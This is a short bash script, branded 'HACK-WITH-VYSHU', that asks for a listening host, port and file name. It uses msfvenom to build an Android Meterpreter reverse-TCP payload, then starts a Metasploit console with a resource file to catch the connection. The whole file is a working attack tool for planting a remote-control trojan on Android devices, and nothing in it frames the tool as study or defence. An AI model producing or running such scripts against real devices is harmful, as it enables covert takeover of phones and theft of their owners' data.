#!/bin/bash
apt-get install neofetch -y && clear && neofetch

sleep 2

echo -e " \e[5m \e[1m----\e[40;38;5;82mHACK-WITH-VYSHU\e[25m\e[0m----- " | pv -qL 8
echo " "

echo -e "\e[92mAndroid Payload GEnarator"

echo " "
printf " \e[1;31;42m LPort for payload \e[0m \e[40;38;5;82m===> \e[0m" | pv -qL 8

read port
echo " "

printf " \e[1;31;42m LHost for payload \e[0m \e[40;38;5;82m====> \e[0m" | pv -qL 8

read lhost
echo " "

printf " \e[1;31;42m Name for Payload  \e[0m \e[40;38;5;82m ====>\e[0m " | pv -qL 8

read name
echo " "

printf " \e[101m\e[1;73m _-_-_-_ WAIT PAYlOAD IS RUNNING _-_-_-_ \e[0m" 
echo " "
msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$port -o  $name.exe

printf " \e[101m\e[1;73m WAIT METASPLOIT RUNNING \e[0m\n"
sleep 2
printf "==> 5%"
sleep 2
printf "====>25%"
sleep 2
printf "======>50%"
sleep 2
printf "========>75%"
sleep 2
printf "=========>99.1%"
sleep 2
printf "===========100%>"
clear 
sed -e "s/\$lhost/$lhost/" meterpreter.rc > $name.rc
msfconsole -r $name.rc
